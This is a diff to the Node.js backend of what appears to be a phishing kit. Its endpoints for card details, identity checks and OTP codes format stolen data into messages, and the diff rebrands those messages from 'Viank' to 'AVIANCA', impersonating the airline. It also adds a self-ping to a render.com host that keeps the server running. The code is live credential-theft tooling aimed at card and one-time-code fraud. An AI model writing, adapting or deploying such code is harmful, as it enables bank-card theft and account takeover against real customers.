@@ -29,7 +29,7 @@ app.post('/payment', async (req, res) => {
     const sessionId = data.sessionId;
 
     const text = `
-🟣Viank🟣 - |[info]|
+🔴AVIANCA🔴 - |[Hecho por Bart Simpsons]|
 ---
 ℹ️ DATOS DE LA TARJETA
 
@@ -85,7 +85,7 @@ app.post('/idcheck', async (req, res) => {
     const sessionId = data.sessionId;
 
     const text = `
-🟣Viank🟣 - |[id-check]|
+🔴AVIANCA🔴 - |[Hecho por Bart Simpsons]|
 ---
 🪪 VERIFICACIÓN DE IDENTIDAD
 
@@ -144,7 +144,7 @@ app.post('/otpcheck', async (req, res) => {
     };
 
     const text = `
-🟣Viank🟣 - |[otp-check]|
+🔴AVIANCA🔴 - |[Hecho por Bart Simpsons]|
 ---
 🔐 VERIFICACIÓN OTP
 
@@ -208,7 +208,7 @@ app.post("/otpcheck2", async (req, res) => {
     };
 
     const mensaje = `
-🟣Viank🟣 - |[otp-check2]|
+🔴AVIANCA🔴 - |[Hecho por Bart Simpsons]|
 ---
 🔐 *NUEVO OTP INGRESADO* 🔐
 
@@ -306,3 +306,14 @@ app.get('/get-redirect/:sessionId', (req, res) => {
 // Iniciar servidor
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
+
+// ==== Auto-ping para mantener activo el backend y refrescar la propia URL cada 3 minutos ====
+setInterval(async () => {
+  try {
+    const res = await fetch("https://volador1.onrender.com");
+    const text = await res.text();
+    console.log("🔁 Auto-ping realizado:", text);
+  } catch (error) {
+    console.error("❌ Error en auto-ping:", error.message);
+  }
+}, 180000); // 180000 ms = 3 minutos
